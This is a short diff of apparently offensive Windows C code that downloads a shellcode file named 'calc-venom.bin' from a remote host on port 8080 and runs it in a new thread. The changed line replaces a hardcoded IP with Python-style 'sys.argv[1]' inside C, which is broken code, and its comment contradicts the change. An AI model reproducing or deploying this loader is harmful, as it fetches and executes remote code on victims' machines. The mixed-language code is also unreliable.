@@ -54,7 +54,8 @@ DWORD WINAPI ExtraLevel1(LPVOID lpParameter) {
 
 
 void main(){
-	sc = WebtoShellc(TEXT("192.168.1.103"), 8080, TEXT("calc-venom.bin"));
+	//Hardcoded values for testing
+	sc = WebtoShellc(TEXT(sys.argv[1]), 8080, TEXT("calc-venom.bin"));
 	HANDLE SparkPlug = CreateThread(nullptr, 1024 * 1024, (LPTHREAD_START_ROUTINE)ExtraLevel1, nullptr, 0, nullptr);
 	WaitForSingleObject(SparkPlug, INFINITE);
 	
